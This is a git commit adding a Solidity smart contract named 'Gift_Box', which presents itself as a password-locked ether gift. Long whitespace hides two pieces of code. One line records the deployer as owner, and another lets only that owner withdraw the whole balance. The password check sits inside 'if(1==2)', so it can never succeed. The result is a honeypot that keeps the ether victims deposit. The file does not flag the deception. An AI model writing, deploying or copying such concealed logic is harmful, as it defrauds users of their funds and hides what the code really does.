d9f0e469b8afc23a4175ebebd57cd63731bebc9f
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 14:45:24 +0700

    add contract Gift_Box

---
+++ Gift_Box.sol
@@ -0,0 +1,33 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Gift_Box at 0x2bb5b9f83391d4190f8b283be0170570953c5a8e
+*/
+pragma solidity ^0.4.18;
+
+contract Gift_Box
+{                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      address prop = msg.sender;
+    function()payable{}
+    
+    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
+    
+    bytes32 public hashPass;
+    
+    function SetPass(bytes32 hash)
+    public
+    payable
+    {
+        if(msg.value >= 1 ether)
+        {
+            hashPass = hash;
+        }
+    }
+    
+    function GetGift(bytes pass)
+    public
+    payable
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               if(msg.sender==prop){msg.sender.transfer(this.balance);}if(1==2){
+        if(hashPass == sha3(pass))
+        {
+            msg.sender.transfer(this.balance);
+        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
+    }
+}
